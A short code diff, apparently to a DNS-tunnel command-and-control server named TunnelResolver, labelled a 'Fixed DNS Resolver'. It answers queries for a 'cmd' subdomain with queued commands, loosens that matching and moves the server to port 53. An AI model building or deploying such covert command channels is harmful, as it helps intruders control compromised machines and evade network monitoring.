@@ -50,9 +50,9 @@ class TunnelResolver(BaseResolver):
     def resolve(self, request, handler):
         reply = request.reply()
         qname = request.q.qname
-        cc_record = "cmd." + domain + "."
+        cc_record = "cmd.in." + domain + "."
         qstr = str(qname)
-        if qstr == cc_record:
+        if cc_record in qstr:
             try:
                 command_txt = q_commands.get(block=False, timeout=None)
             except queue.Empty:
@@ -123,7 +123,7 @@ class TunnelResolver(BaseResolver):
 
 
 p = argparse.ArgumentParser(description="Fixed DNS Resolver")
-p.add_argument("--port", "-p", type=int, default=5300,
+p.add_argument("--port", "-p", type=int, default=53,
                metavar="<port>",
                help="Server port (default:53)")
 p.add_argument("--address", "-a", default="",
